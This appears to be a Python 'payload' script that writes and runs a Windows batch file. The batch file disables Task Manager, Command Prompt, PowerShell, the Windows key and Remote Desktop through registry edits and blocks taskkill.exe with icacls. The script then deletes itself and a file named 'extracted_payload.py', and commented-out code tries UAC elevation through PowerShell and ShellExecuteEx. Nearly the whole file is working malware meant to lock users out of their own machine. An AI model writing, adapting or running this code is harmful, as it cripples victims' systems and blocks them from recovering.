import tkinter as tk
from tkinter import messagebox
import os
import sys
import subprocess

print("Start Payload")

# The content of the batch file that will be executed with administrator privileges
batch_content = r'''@echo off
:: Check if the script is running as administrator
::NET SESSION >nul 2>&1
::if %errorlevel% neq 0 (
    :: Re-launch the batch script as administrator using PowerShell
    ::powershell -Command "Start-Process cmd -ArgumentList '/c', '%%~f0' -Verb runAs"
    ::exit /b
::)

:: Disable Task Manager
echo Disabling Task Manager...
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f

:: Disable Command Prompt
echo Disabling Command Prompt...
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 2 /f

:: Disable PowerShell
echo Disabling PowerShell...
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisablePowershell /t REG_DWORD /d 1 /f

:: Prevent taskkill from running (make it read-only)
echo Preventing taskkill.exe from being executed...
icacls "C:\Windows\System32\taskkill.exe" /deny Everyone:(R)

:: Disable Windows Key
echo Disabling Windows Key without restart...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWinKeys /t REG_DWORD /d 1 /f

:: Refresh Explorer to apply changes immediately
taskkill /im explorer.exe /f >nul 2>&1
start explorer.exe

:: Disable Remote Desktop
echo Disabling Remote Desktop...
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
pause
'''

# Path where the batch file will be created
batch_file = 'admin_script.bat'
print("Just created the bat")

# Create the batch file
with open(batch_file, 'w') as f:
    f.write(batch_content)

def check_cmd_disabled():
    try:
        # Try to run a basic command in Command Prompt
        subprocess.run(["cmd", "/c", "echo Hello, World!"], check=True)
        print("Command Prompt is enabled.")
    except subprocess.CalledProcessError as e:
        print("Command Prompt seems to be disabled.")
    except Exception as e:
        print(f"An error occurred: {e}")


def windows_payload():
    try:
        # subprocess.run(
        #     ["cmd", "/c", "admin_script.bat"],
        #     creationflags=subprocess.CREATE_NO_WINDOW  # Optional: hide the command window
        # )
        subprocess.run(
            ["cmd", "/c", "admin_script.bat"]
        )
        print("Batch file executed successfully!")
    except Exception as e:
        print(f"Error executing batch file: {e}")

    os.remove("./admin_script.bat")
    os.remove("./extracted_payload.py")

windows_payload()
check_cmd_disabled()

# #Run the batch file with administrator privileges without prompts
# try:
#     # Command to execute the batch file with administrator rights
#     subprocess.run(['powershell', '-Command', f'Start-Process cmd -ArgumentList "/c {os.path.abspath(batch_file)}" -Verb runAs'], check=True)
# except subprocess.CalledProcessError as e:
#     print(f"Error while trying to run the batch file with administrator privileges: {e}")

# import ctypes
# import os

# print("Start Payload")

# def run_command(command):
#     """ Run a command with elevated privileges within the same script using ctypes """
#     # Using ctypes to call Windows APIs to execute commands
#     kernel32 = ctypes.windll.kernel32
#     shell32 = ctypes.windll.shell32

#     SEE_MASK_NOCLOSEPROCESS = 0x00000040
#     SEE_MASK_FLAG_DDEWAIT = 0x00000100
#     SEE_MASK_NO_CONSOLE = 0x00008000

#     class SHELLEXECUTEINFO(ctypes.Structure):
#         _fields_ = [("cbSize", ctypes.c_ulong),
#                     ("fMask", ctypes.c_ulong),
#                     ("hwnd", ctypes.c_void_p),
#                     ("lpVerb", ctypes.c_wchar_p),
#                     ("lpFile", ctypes.c_wchar_p),
#                     ("lpParameters", ctypes.c_wchar_p),
#                     ("lpDirectory", ctypes.c_wchar_p),
#                     ("nShow", ctypes.c_int),
#                     ("hInstApp", ctypes.c_void_p),
#                     ("lpIDList", ctypes.c_void_p),
#                     ("lpClass", ctypes.c_wchar_p),
#                     ("hkeyClass", ctypes.c_void_p),
#                     ("dwHotKey", ctypes.c_ulong),
#                     ("hIconOrMonitor", ctypes.c_void_p),
#                     ("hProcess", ctypes.c_void_p)]

#     execute_info = SHELLEXECUTEINFO()
#     execute_info.cbSize = ctypes.sizeof(SHELLEXECUTEINFO)
#     execute_info.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_DDEWAIT | SEE_MASK_NO_CONSOLE
#     execute_info.hwnd = None
#     execute_info.lpVerb = "runas"
#     execute_info.lpFile = "cmd"
#     execute_info.lpParameters = f'/c {command}'
#     execute_info.lpDirectory = None
#     execute_info.nShow = 1
#     execute_info.hInstApp = None

#     if not shell32.ShellExecuteEx(ctypes.byref(execute_info)):
#         raise ctypes.WinError()

#     hProcess = execute_info.hProcess
#     kernel32.WaitForSingleObject(hProcess, 0xFFFFFFFF)
#     kernel32.CloseHandle(hProcess)

#     print(f"Command executed successfully: {command}")

# def run_batch_commands():
#     """ Run the commands from the batch file directly in an elevated context """
#     commands = [
#         'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f',
#         'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableCMD /t REG_DWORD /d 2 /f',
#         'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisablePowershell /t REG_DWORD /d 1 /f',
#         'icacls "C:\\Windows\\System32\\taskkill.exe" /deny Everyone:(R)',
#         'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoWinKeys /t REG_DWORD /d 1 /f',
#         'taskkill /im explorer.exe /f',
#         'start explorer.exe',
#         'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f'
#     ]

#     for command in commands:
#         try:
#             run_command(command)
#         except Exception as e:
#             print(f"Error running command: {e}")

# def windows_payload():
#     run_batch_commands()

# windows_payload()


